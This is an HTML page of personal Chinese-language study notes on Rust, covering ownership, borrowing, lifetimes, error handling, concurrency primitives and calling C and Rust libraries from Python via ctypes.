<p>看上面的例子。<code>str_a</code>在这里就是<code>&quot;fdaaaaa&quot;</code>的owner。当owner的生命周期结束的时候，&quot;fdaaaaa&quot;占用的内存被释放(Drop)。怎么理解第二点呢？看下面的例子，str_b成为<code>&quot;fdaaaaa&quot;</code>的owner了，但是只能有一个owner，str_a就无效了，编译器会发现这个错误。
类似的，如果把str_a传入另一个函数，那么在那个函数退出的时候，会把str_a清理，原函数中的str_a就失效了，编译器会发现这个错误。</p>
<pre><pre class="playground"><code class="language-rust">fn main(){
    let str_a = String::from(&quot;fdaaaaa&quot;); 
    let str_b = str_a;
    println!(&quot;{}&quot;,str_b);   //str_a已经无效了           
} 
</code></pre></pre>
<p>Trait<code>Drop</code>：在变量离开其作用域的时候被调用，完成一些内存的释放工作。
Trait<code>Copy</code>，rust中的类型，如果没有实现Copy trait，那么在此类型的<strong>变量赋值、函数入参、函数返回值都是move语义</strong>（类比于c++）。并且如果实现了Copy语义，就不会被Drop。（禁止内存的二次释放）。所以一般来说，存储在Stack上的简单类型才会实现Copy trait。比如在上面这个例子，<code>str_a</code>已经Move到<code>str_b</code>上了。str_a就无效了。</p>
<p>可是有时候我们可能不想要这个特性，比如在函数传递参数、for循环枚举的时候。为此，Rust有<strong>Reference</strong>这个概念。可以认为不是Owner但是可以引用变量的内容。如下例：</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let s1 = String::from(&quot;hello&quot;);

    let len = calculate_length(&amp;s1);

    println!(&quot;The length of '{}' is {}.&quot;, s1, len);
}

fn calculate_length(s: &amp;String) -&gt; usize {
    s.len()
}
</code></pre></pre>
<p><img src="Language/Rust/../images/1616217051614.svg" alt="" />
reference:<code>&amp;</code> mutable reference:<code>&amp;mut </code>, dereference:<code>*</code>。
变量 s 有效的作用域与函数参数的作用域一样，不过<strong>当引用离开作用域后并不丢弃它指向的数据（不Drop）</strong>，因为我们没有所有权。当函数使用引用而不是实际值作为参数，无需通过返回值来交还所有权，因为就不曾拥有所有权。
注意一个<strong>引用的作用域从声明的地方开始一直持续到最后一次使用为止</strong>。
Reference:</p>
<blockquote>
<p>At any given time, you can have either one mutable reference or any number of immutable references. 
References must always be valid. （在Rust中编译器确保引用永远也不会变成悬垂状态：当你拥有一些数据的引用，编译器确保数据不会在其引用之前离开作用域。variable live longer than its reference）</p>
</blockquote>
<p>Rust强大的地方在于，他甚至能在编译的时候就保证这些特性。</p>
<p>另一个<strong>Slice</strong>概念，也可以不是Owner，引用变量的内容，不过是引用集合中一段连续的元素序列。Slice也是不可变的。Slice:<code>s[1..4]</code>。
类似的，Rust在编译的时候，就保证Slice是始终有效的。</p>
<h2 id="错误处理-第九章"><a class="header" href="#错误处理-第九章">错误处理-第九章</a></h2>
<p>定义了Result枚举。很多可能产生错误的方法的返回值都是Result类型。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum Result&lt;T, E&gt; {
    Ok(T),
    Err(E),
}
<span class="boring">}
</span></code></pre></pre>
<p>现在你需要知道的就是 T 代表成功时返回的 Ok 成员中的数据的类型，而 E 代表失败时返回的 Err 成员中的错误的类型。
如果无法从错误中恢复，可以<code>panic!</code>
如果可以处理错误，可以用match来判断是否发生错误分别处理。还有高级的处理办法，我没看懂。也可以把错误返回，不过这样函数的返回值最好是Result类型的。
Result还提供了<code>except()</code>方法来简化，如果正常会自己返回正常的内容，不正常会自己调用<code>panic!</code>。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let f = File::open(&quot;hello.txt&quot;);

    let f = match f {
        Ok(file) =&gt; file,       //正常工作
        Err(error) =&gt; match error.kind() {
            ErrorKind::NotFound =&gt; match File::create(&quot;hello.txt&quot;) {    //可以恢复的错误
                Ok(fc) =&gt; fc,
                Err(e) =&gt; panic!(&quot;Problem creating the file: {:?}&quot;, e),     //不可以恢复的错误
            },
            other_error =&gt; panic!(&quot;Problem opening the file: {:?}&quot;, other_error),
        },
    };
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="多线程支持"><a class="header" href="#多线程支持">多线程支持</a></h1>
<h2 id="线程-标准库"><a class="header" href="#线程-标准库">线程-标准库</a></h2>
<p>官方提供的<code>std::thread</code>，可以创建线程、等待线程。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 创建线程
let handle = thread::spawn(move || {
        println!(&quot;Here's a vector: {:?}&quot;, v);
    });
// 等待线程
handle.join().unwrap();
<span class="boring">}
</span></code></pre></pre>
<h2 id="全局变量"><a class="header" href="#全局变量">全局变量</a></h2>
<p>如果允许多个线程同时修改全局变量，会造成数据竞争。Rust是不允许这种情况发生的。</p>
<ol>
<li>
<p>可以通过 <code>thread_local!</code>宏在<strong>本地线程</strong>中使用内部可变性容器。当然这意味着这个全局变量不是被所有线程共享了。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>thread_local!{
    // 符合
    static NEXT_USER_ID: Cell&lt;u64&gt; = Cell::new(0);
}
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p>如果需要被所有线程共享，而且是整数和布尔类型话，可以用<code>Atomic</code>；如果不是的话，可以根据情况考虑使用<code>Mutex</code>和<code>Rwlock</code>。全局变量的初始化，可能需要配合<code>lazy_static</code>和<code>OnceCell</code>，有第三方库和标准库的支持。</p>
</li>
</ol>
<h2 id="线程通信-channel"><a class="header" href="#线程通信-channel">线程通信-channel</a></h2>
<blockquote>
<p>Do not communicate by sharing memory; instead, share memory by communicating.</p>
</blockquote>
<p>编程中的通道有两部分组成，一个发送者（transmitter）和一个接收者（receiver）。发送者位于上游位置，在这里可以将橡皮鸭放入河中，接收者则位于下游，橡皮鸭最终会漂流至此。代码中的一部分调用发送者的方法以及希望发送的数据，另一部分则检查接收端收到的消息。当发送者或接收者任一被丢弃时可以认为通道被 <strong>关闭</strong>（<em>closed</em>）了。</p>
<p>使用mpsc(multiple producer single consumer)提供的channel进行通信。</p>
<pre><pre class="playground"><code class="language-rust">use std::thread;
use std::sync::mpsc;

fn main() {
    let (tx, rx) = mpsc::channel();
    let tx1 = tx.clone();	
    // multi producer
    thread::spawn(move || {
        let val = String::from(&quot;hi&quot;);
        tx.send(val).unwrap();
    });
    thread::spawn(move || {
        let val = String::from(&quot;hello&quot;);
        tx1.send(val).unwrap();
    });
	// single consumer
    for received in rx {
        println!(&quot;Got: {}&quot;, received);
    }
}
</code></pre></pre>
<p>虽然通道rx中的接收顺序和发送顺序是一致的，但是不同线程之间执行顺序是不确定的，也就是说这里的<code>hi</code>和<code>hello</code>可能是乱序的。</p>
<h2 id="线程通信-锁"><a class="header" href="#线程通信-锁">线程通信-锁</a></h2>
<p>如果我就是要通过共享内存的方式完成线程通信呢。</p>
<p>比如常用的Mutex互斥锁（这里指的是这个概念，不是rust中的），在一般语言中，我们需要：</p>
<ol>
<li>在使用数据之前尝试获取锁。</li>
<li>处理完被互斥器所保护的数据之后，必须解锁数据，这样其他线程才能够获取锁。（在Rust中，借用RAII的思想，并不需要这样）</li>
</ol>
<p>让我们使用<code>Arc&lt;Mutex&lt;T&gt;&gt;</code>来解决问题。在下面这个例子中，<code>counter</code>就是<code>Arc&lt;Mutex&lt;i32&gt;&gt;</code>。使用<code>Arc</code>的原因是我们即需要多所有权的引用计数用于共享（<code>Rc</code>即可），而且引用计数的修改必须是线程安全的（<code>Rc</code>做不到）。<code>Mutex</code>也是必要的，我们必须要保证我们使用数据的时候对数据是独占的（其实读可以不是独占的，但是那是另一个故事读写锁了）。</p>
<pre><pre class="playground"><code class="language-rust">use std::sync::{Mutex, Arc};
use std::thread;

fn main() {
    let counter = Arc::new(Mutex::new(0));
    let mut handles = vec![];

    for _ in 0..10 {
        let counter = Arc::clone(&amp;counter);
        let handle = thread::spawn(move || {
            let mut num = counter.lock().unwrap();

            *num += 1;
        });
        handles.push(handle);
    }

    for handle in handles {
        handle.join().unwrap();
    }

    println!(&quot;Result: {}&quot;, *counter.lock().unwrap());
}
</code></pre></pre>
<blockquote>
<p><code>pub fn lock(&amp;self) -&gt; LockResult&lt;MutexGuard&lt;'_, T&gt;&gt;</code></p>
<p>This function will <strong>block</strong> the local thread until it is available to acquire the mutex. Upon returning, the thread is the only thread with the lock held. An <strong>RAII</strong> guard is returned to allow scoped unlock of the lock. <strong>When the guard goes out of scope, the mutex will be unlocked.</strong></p>
<p>阻塞的，释放锁通过RAII机制，所以也可以<code>drop(mutex)</code>来释放锁。</p>
</blockquote>
<p>如果我们用Rc代替Arc，编辑器会报错。报错的实现依赖于标记<code>Send</code>和<code>Sync</code>。</p>
<p><a href="https://kaisery.github.io/trpl-zh-cn/ch16-04-extensible-concurrency-sync-and-send.html#%E9%80%9A%E8%BF%87-send-%E5%85%81%E8%AE%B8%E5%9C%A8%E7%BA%BF%E7%A8%8B%E9%97%B4%E8%BD%AC%E7%A7%BB%E6%89%80%E6%9C%89%E6%9D%83">通过 <code>Send</code> 允许在线程间转移所有权</a>：<code>Send</code> 标记 trait 表明类型的所有权可以在线程间传递。几乎所有的 Rust 类型都是<code>Send</code> 的，不过有一些例外，包括 <code>Rc&lt;T&gt;</code>：这是不能 <code>Send</code> 的，因为如果克隆了 <code>Rc&lt;T&gt;</code> 的值并尝试将克隆的所有权转移到另一个线程，这两个线程都可能同时更新引用计数。为此，<code>Rc&lt;T&gt;</code> 被实现为用于单线程场景，这时不需要为拥有线程安全的引用计数而付出性能代价。任何完全由 <code>Send</code> 的类型组成的类型也会自动被标记为 <code>Send</code>。几乎所有基本类型都是 <code>Send</code> 的，除了第十九章将会讨论的裸指针（raw pointer）。</p>
<p><a href="https://kaisery.github.io/trpl-zh-cn/ch16-04-extensible-concurrency-sync-and-send.html#sync-%E5%85%81%E8%AE%B8%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BF%E9%97%AE"><code>Sync</code> 允许多线程访问</a>：<code>Sync</code> 标记 trait 表明一个实现了 <code>Sync</code> 的类型可以安全的在多个线程中拥有其值的引用。换一种方式来说，对于任意类型 <code>T</code>，如果 <code>&amp;T</code>（<code>T</code> 的引用）是 <code>Send</code> 的话 <code>T</code> 就是 <code>Sync</code> 的，这意味着其引用就可以安全的发送到另一个线程。类似于 <code>Send</code> 的情况，基本类型是 <code>Sync</code> 的，完全由 <code>Sync</code> 的类型组成的类型也是 <code>Sync</code> 的。</p>
<h3 id="rwlock-1"><a class="header" href="#rwlock-1">RwLock</a></h3>
<p>读写锁.就是课堂上学习的读写锁的概念.使用得当可以增加程序的并发性,提高效率.</p>
<blockquote>
<ul>
<li>读锁之间不互斥，没有写锁的情况下，读锁是无阻塞的，多个协程可以同时获得读锁。</li>
<li>写锁之间是互斥的，存在写锁，其他写锁阻塞。</li>
<li>写锁与读锁是互斥的，如果存在读锁，写锁阻塞，如果存在写锁，读锁阻塞。</li>
</ul>
</blockquote>
<p>和Mutex的接口是类似的:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let lock = Arc::new(RwLock::new(1));
let c_lock = Arc::clone(&amp;lock);
// 获取读锁
let n = lock.read().unwrap();
assert_eq!(*n, 1);
// 获取写锁
let mut n = lock.write().unwrap();
*n = 2;
<span class="boring">}
</span></code></pre></pre>
<h2 id="阻塞非阻塞同步异步"><a class="header" href="#阻塞非阻塞同步异步">阻塞,非阻塞,同步,异步</a></h2>
<blockquote>
<p>所谓同步，就是在发出一个功能调用时，在没有得到结果之前，该调用就不返回。按照这个定义，其实绝大多数函数都是同步调用</p>
<p>异步的概念和同步相对。当一个异步过程调用发出后，调用者不能立刻得到结果。实际处理这个调用的部件在完成后，通过状态、通知和回调来通知调用者。</p>
</blockquote>
<blockquote>
<p>阻塞调用是指调用结果返回之前，当前<strong>线程会被挂起</strong>。函数只有在得到结果之后才会返回。有人也许会把阻塞调用和同步调用等同起来，实际上它们是不同的。对于同步调用来说，很多时候当前线程还是激活的，只是从逻辑上当前函数没有返回而已。</p>
<p>非阻塞和阻塞的概念相对应，指在不能立刻得到结果之前，该函数不会阻塞当前线程，而会立刻返回。</p>
</blockquote>
<h2 id="core-spin"><a class="header" href="#core-spin">Core-spin</a></h2>
<p><a href="https://crates.io/crates/spin">spin</a>提供了不依赖std的锁。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="混合编程"><a class="header" href="#混合编程">混合编程</a></h1>
<p>目前最熟悉的三个语言就是C, Rust, Python了。他们是可以组合在一起混合编程的，哪个合适用哪个。比如你可以用C和系统交互，Rust编写核心模块，然后他们编译出动态库/静态库/可执行文件，再用Python做前端调用。反着调用也行。</p>
<h2 id="可执行文件"><a class="header" href="#可执行文件">可执行文件</a></h2>
<p>这个是最简单的但是效率不高的办法。利用标准输出/输入作为通信接口就可以实现。在python可以利用<code>fork</code>和<code>exec</code>，在os模块有提供这种方法。还有Subprocess。</p>
<p>当然你还可以使用socket进行进程间的通信。</p>
<h2 id="c--python"><a class="header" href="#c--python">C =&gt; Python</a></h2>
<p>https://realpython.com/python-bindings-overview/#python-bindings-overview</p>
<p><a href="https://docs.python.org/3/library/ctypes.html?highlight=ctypes#module-ctypes">ctypes</a>库让我们可以以动态链接库的形式调用C函数。我们直接来一个demo </p>
<pre><code class="language-c">// gcc -fPIC -shared -o lib.so lib.c
#include &lt;string.h&gt;

int foo(int a, int b) { return a + b; }

char *bar(char *a, char *b) {
  a[0] = b[0];
  return a;
}

struct point {
  int x;
  int y;
};

void move(struct point *start, struct point offset) {
  start-&gt;x += offset.x;
  start-&gt;y += offset.y;
}
</code></pre>
<pre><code class="language-python">import ctypes

# 获得动态库的一个句柄
lib = ctypes.CDLL(&quot;./lib.so&quot;)

# 最简单的调用方法，默认的返回值是int
ret = lib.foo(1,2)

# 稍微正式一点的调用方法
a = ctypes.c_int(1)
b = ctypes.c_int(2)
ret = lib.foo(a,b)

# 科学的调用方法，先规定参数类型便于检查
# 指定数据类型可以防止不合理的参数传递，并且会自动尝试将参数转换为需要的类型
lib.foo.argtypes = [ctypes.c_int,ctypes.c_int]
lib.foo.restype = ctypes.c_int
ret = lib.foo(1, 2)

lib.bar.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
lib.bar.restype = ctypes.c_char_p
ret = lib.bar(b&quot;123&quot;,b&quot;456&quot;)

# 定义了一个结构体
class POINT(ctypes.Structure):
    _fields_ = [(&quot;x&quot;, ctypes.c_int),
                (&quot;y&quot;, ctypes.c_int)]
point = POINT(10, 20)
# 指针类型 POINTER
lib.move.argtypes = [ctypes.POINTER(POINT), POINT]
# 构造指针的两种方式
lib.move(ctypes.byref(point),point)
lib.move(ctypes.pointer(point),point)
</code></pre>
<p>可以看出调用是很简单的，重要的是<strong>类型的约定</strong>，以及<strong>指针和内存</strong>。</p>
<h3 id="类型-2"><a class="header" href="#类型-2">类型</a></h3>
<p><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#module-ctypes"><code>ctypes</code></a> 定义了一些和C兼容的基本数据类型，这都是比较基础的类型。如果传进去的是指针，那么他真的指向了python中的内容，对指针的修改也会修改到python里对象的值，可以用<a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.pointer"><code>pointer</code></a>来构造指向ctype的指针。C里所有的整数在python中都是int, 所有的浮点数在python里都是float。</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">ctypes 类型</th><th style="text-align: left">C 类型</th><th style="text-align: left">Python 类型</th></tr></thead><tbody>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_bool"><code>c_bool</code></a></td><td style="text-align: left">_Bool</td><td style="text-align: left">bool (1)</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_char"><code>c_char</code></a></td><td style="text-align: left">char</td><td style="text-align: left">单字符字节串对象</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_byte"><code>c_byte</code></a></td><td style="text-align: left">char</td><td style="text-align: left">int</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_ubyte"><code>c_ubyte</code></a></td><td style="text-align: left">unsigned char</td><td style="text-align: left">int</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_short"><code>c_short</code></a></td><td style="text-align: left">short</td><td style="text-align: left">int</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_ushort"><code>c_ushort</code></a></td><td style="text-align: left">unsigned short</td><td style="text-align: left">int</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_int"><code>c_int</code></a></td><td style="text-align: left">int</td><td style="text-align: left">int</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_uint"><code>c_uint</code></a></td><td style="text-align: left">unsigned int</td><td style="text-align: left">int</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_double"><code>c_double</code></a></td><td style="text-align: left">double</td><td style="text-align: left">float</td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_char_p"><code>c_char_p</code></a></td><td style="text-align: left">char* (以 NUL 结尾)</td><td style="text-align: left">字节串对象或 <code>None</code></td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_wchar_p"><code>c_wchar_p</code></a></td><td style="text-align: left">wchar_t* (以 NUL 结尾)</td><td style="text-align: left">字符串或 <code>None</code></td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_void_p"><code>c_void_p</code></a></td><td style="text-align: left">void*</td><td style="text-align: left">int 或 <code>None</code></td></tr>
<tr><td style="text-align: left"><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.c_wchar"><code>c_wchar</code></a></td><td style="text-align: left"><code>wchar_t</code></td><td style="text-align: left">单字符字符串</td></tr>
</tbody></table>
</div>
<p>上面是基本类型，那么像struct这样的组合类型要怎么定义呢？结构体和联合必须继承自 <a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#module-ctypes"><code>ctypes</code></a> 模块中的<a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.Structure"><code>Structure</code></a> 和 <a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.Union"><code>Union</code></a> 。</p>
<h3 id="指针"><a class="header" href="#指针">指针</a></h3>
<p><code>byref</code>和<code>pointer</code>函数的效果和C语言中的<code>&amp;</code>非常相似。<code>byref(obj, offset)</code> 对应于这段 C 代码:</p>
<pre><code class="language-c">(((char *)&amp;obj) + offset)
</code></pre>
<blockquote>
<p><a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#module-ctypes"><code>ctypes</code></a> 暴露了 <a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.byref"><code>byref()</code></a> 函数用于通过引用传递参数，使用 <a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.pointer"><code>pointer()</code></a> 函数也能达到同样的效果，只不过 <a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.pointer"><code>pointer()</code></a> 需要更多步骤，因为它要先构造一个真实指针对象。所以在 Python 代码本身不需要使用这个指针对象的情况下，使用 <a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctypes#ctypes.byref"><code>byref()</code></a> 效率更高。</p>
</blockquote>
<p><code>pointer(obj)</code>会创建一个新的指向<code>obj</code>的指针实例。 返回的对象类型为 <code>POINTER(type(obj))</code>。</p>
<p><code>POINTER(type)</code>这个工厂函数创建并返回一个新的 ctypes 指针类型。 指针类型会被缓存并在内部重用，因此重复调用此函数耗费不大。 <em>type</em> 必须为 ctypes 类型。</p>
<h2 id="rust--python"><a class="header" href="#rust--python">Rust =&gt; Python</a></h2>
<p>Rust可以构建具有C ABI的库，所以交互方式和上面原理一致。那么我们来看Rust怎么构建C ABI的库。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[no_mangle]
pub extern &quot;C&quot; fn add(a: u32, b: u32) -&gt; u32 {
    a + b
}
<span class="boring">}
</span></code></pre></pre>
<p>源代码中要导出的函数用<code>extern &quot;C&quot;</code>标记表示生成C ABI，并用<code>#[no_mangle]</code>避免名字重整。</p>
<p>C中的指针类型就是<code>* const T</code>和<code>* mut T</code>两个裸指针，对于结构体和枚举，Rust中也有对应的概念，不过需要用<code>repr(C)</code>修饰来保持和C一样的内存布局。</p>
<pre><code class="language-toml">[lib]
crate-type = [&quot;cdylib&quot;]
</code></pre>
<p>在Cargo.toml加入这一句，指明编译动态链接库文件。</p>
<h2 id="pyo3"><a class="header" href="#pyo3">PyO3</a></h2>
<p>https://pyo3.rs/v0.15.1/</p>
<h2 id="c--rust"><a class="header" href="#c--rust">C =&gt; Rust</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust-精髓"><a class="header" href="#rust-精髓">Rust-精髓</a></h1>
<h2 id="所有权"><a class="header" href="#所有权">所有权</a></h2>
<blockquote>
<p>Each value in Rust has a variable that's called its owner.
There can only be one owner at one time.
When the owner goes out of scope, the value will be dropped.</p>
</blockquote>
<h3 id="所有权解决了什么问题"><a class="header" href="#所有权解决了什么问题">所有权解决了什么问题</a></h3>
<p>通过保证同时只有一个owner，就不会出现反复释放同一块内存（Drop）的情况。防止内存泄露。并且Owner在离开作用域的时候被自动Drop，无需手动。在Rust中没有手动释放内存的操作（有的，不过那个实现很有意思。也不能算是手动释放内存，应该说是提前结束变量的生命周期。</p>
<h2 id="生命周期"><a class="header" href="#生命周期">生命周期</a></h2>
<p>https://learning-rust.github.io/docs/c3.lifetimes.html</p>
<h3 id="生命周期解决了什么问题"><a class="header" href="#生命周期解决了什么问题">生命周期解决了什么问题</a></h3>
<p>当我们使用Reference的时候，我们要保证referencing data的生存时间比我们的reference长，准确的说是我们不再使用reference的时候referencing data依然存在。否则就是<strong>悬垂引用</strong>（在C/C++语言中，就是一个指向无效地址的指针）。生命周期就是为了解决这个问题。</p>
<ul>
<li>A resource can only have <strong>one owner</strong> at a time. When it goes <strong>out of the scope</strong>, Rust removes it from the Memory.</li>
<li>When we want to reuse the same resource, we are <strong>referencing</strong> it/ <strong>borrowing</strong> its content.</li>
<li>When dealing with <strong>references</strong>, we have to specify <strong>lifetime annotations</strong> to provide instructions for the <strong>compiler</strong> to set <strong>how long</strong> those referenced resources <strong>should be alive</strong>.</li>
<li>But because of lifetime annotations make the <strong>code more verbose</strong>, in order to make <strong>common patterns</strong> more ergonomic, Rust allows lifetimes to be <strong>elided/omitted</strong> in <code>fn</code> definitions. In this case, the compiler assigns lifetime annotations <strong>implicitly</strong>.</li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>//error:`y` does not live long enough
{
    let x: &amp;Vec&lt;i32&gt;;
    {
        let y = Vec::new();//-|--+
//                               |              |
    }// &lt;+              | x's lifetime
    println!(&quot;x's length is {}&quot;, x.len());//    |
}// &lt;-+
<span class="boring">}
</span></code></pre></pre>
<h3 id="生命周期标记"><a class="header" href="#生命周期标记">生命周期标记</a></h3>
<p><a href="https://hashrust.com/blog/lifetimes-in-rust/">一篇写的不错的blog</a>。对于普通的变量生命周期很好理解，用C语言的知识就足够了，二者还是类似的。不过考虑到跨函数引用的生命周期，问题就不那么简单了。</p>
<p>这个是一个比较难以理解的地方。首先我们应该知道reference的本质是单纯的指针，无论是lifetime还是mut都是编译器做静态分析时候用的。</p>
<p>每一个reference都应该有一个生命周期标记。一种特殊的参数是<code>'static</code>表示静态变量有和程序一样长的生命周期；一般的参数<code>'a 'b</code>等来表示。<code>'a:'b</code>表示a的生命周期包含b。</p>
<p>对于下面两个<code>'a</code>的含义并不是s2和返回值的生命周期相同，而是<strong>使用<code>'a</code>标注的返回的reference借用自具有相同标注的参数</strong>。对于下面这个函数，为什么编译器不能帮我们自动推断生命周期呢？可以，但是不好。因为<strong>否则的话我们必须阅读源代码才能知道返回值是和s1还是和s2的传入参数借用自具有相同标注的参数</strong>。</p>
<pre><code>fn print_ret&lt;'a&gt;(s1: &amp;str, s2: &amp;'a str) -&gt; &amp;'a str {
    println!(&quot;s1 is {}&quot;, s1);
    s2
}
fn main() {
    let some_str: String = &quot;Some string&quot;.to_string();
    let other_str: String = &quot;Other string&quot;.to_string();//-+
    let ret = print_ret(&amp;some_str, &amp;other_str);//--+-----+
</code></pre>
<p>那下面这个又是什么意思？意思是**返回值可能和x借用自相同标注的参数，也可能和y借用自相同标注的参数。**那么编译器要做的检查是，<strong>x的借用对象p的生命周期和y借用对象q的生命周期必须都大于返回值的生命周期</strong>。</p>
<pre><code>fn min&lt;'a&gt;(x: &amp;'a i32, y: &amp;'a i32) -&gt; &amp;'a i32 {
    if x &lt; y {
        x
    } else {
        y
    }
}
fn main() {
    let p = 42;
    {
        let q = 10;
        let r = min(&amp;p, &amp;q);
        println!(&quot;Min is {}&quot;, r);
    }
}
</code></pre>
<p>生命周期省略：如果你不写生命周期，编译器<strong>会自动按照固定的规则帮你补全（而不是推断）</strong>，但不一定是你要的那个意思。所以不妨写一下。</p>
<p>最简单的记住如果只有一个参数，拿编译器会把返回值的生命周期指定为这个参数。如果有&amp;self,&amp;mut self参数，会默认指定成self。用户un</p>
<h2 id="引用-reference"><a class="header" href="#引用-reference">引用 reference</a></h2>
<p>引用的本质是指针，不会获得引用变量的ownership。比如在函数传递参数、for循环枚举的时候我们可能需要这个特性。如下例：</p>
<pre><code>fn main() {
    let s1 = String::from(&quot;hello&quot;);
    let len = calculate_length(&amp;s1);

    println!(&quot;The length of '{}' is {}.&quot;, s1, len);
}

fn calculate_length(s: &amp;String) -&gt; usize {
    s.len()
}
</code></pre>
<p><img src="Language/Rust/../images/1616217051614.svg" alt="" />
reference:<code>&amp;</code> mutable reference:<code>&amp;mut </code>, dereference:<code>*</code>。
变量 s 有效的作用域与函数参数的作用域一样，不过<strong>当引用离开作用域后并不丢弃它指向的数据（不Drop）</strong>，因为我们没有所有权。当函数使用引用而不是实际值作为参数，无需通过返回值来交还所有权，因为就不曾拥有所有权。
注意一个<strong>引用的作用域从声明的地方开始一直持续到最后一次使用为止</strong>。
Reference:</p>
<blockquote>
<p>At any given time, you can have either one mutable reference or any number of immutable references. （共享不可变 ，可变不共享）
References must always be valid. （在Rust中编译器确保引用永远也不会变成悬垂状态：当你拥有一些数据的引用，编译器确保数据不会在其引用之前离开作用域。variable live longer than its reference）</p>
</blockquote>
<p>Rust强大的地方在于，他甚至能在编译的时候就保证这些特性。</p>
<p>另一个<strong>Slice</strong>概念，也可以不是Owner，引用变量的内容，不过是引用集合中一段连续的元素序列。Slice也是不可变的。Slice:<code>s[1..4]</code>。
类似的，Rust在编译的时候，就保证Slice是始终有效的。</p>
<p>我们可以自定义<code>Deref</code>以及<code>DerefMut</code>方法。不过需要注意的是他们的返回类型是reference。也就是说，比如我们对类型<code>String</code>定义了<code>Deref</code>方法返回<code>&amp;str</code>，s的类型是String，那么<code>*s</code>其实是执行了<code>* s.deref()</code>。</p>
<p>所以如果我们对一个类型实现了Deref方法，他就能<strong>表现的像一个指针一样</strong>或者我们称他为智能指针，比如<code>String</code>我们就可以把它当成一个指针指向一个堆上分配的unicode字符数组，并携带有缓存空间总大小和字符串长度的metadata。</p>
<p>而编译器的<strong>自动解引用</strong>机制能让我们的代码写的更舒服。什么是自动解引用，就是比如<code>s.len()</code>找不到方法的时候，编译器会自动帮我们看看<code>s.deref().len</code>有没有，<code>s.deref().deref().len</code>有没有......。直到找到为止。另外，<code>.</code>运算符也是可以帮我们<strong>自动取引用</strong>的。总之，他会帮我们找到正确的方法。</p>
<pre><code>pub trait Deref {
    type Target: ?Sized;
    #[must_use]
    fn deref(&amp;self) -&gt; &amp;Self::Target;
}

pub trait DerefMut: Deref {
    fn deref_mut(&amp;mut self) -&gt; &amp;mut Self::Target;
}
</code></pre>
<h2 id="智能指针-3"><a class="header" href="#智能指针-3">智能指针</a></h2>
<p>Rust 中最常见的指针是第四章介绍的 引用（reference）。引用以 &amp; 符号为标志并借用了他们所指向的值。除了引用数据没有任何其他特殊功能。它们也没有任何额外开销，所以应用得最多。
<strong>智能指针（smart pointers）是一类数据结构，他们的表现类似指针，但是也拥有额外的元数据和功能。</strong> 我们看的到的String和Vec都是智能指针。通常用结构体来实现，但是智能指针区别于常规的结构体的显著特性在于实现了<code>Deref</code>和<code>Drop</code>两个trait。 <strong><code>Deref</code>允许智能指针结构体实例表现的像引用一样。<code>Drop</code>允许我们自定义当智能指针离开作用域时运行的代码（类似析构函数的感觉）</strong>。</p>
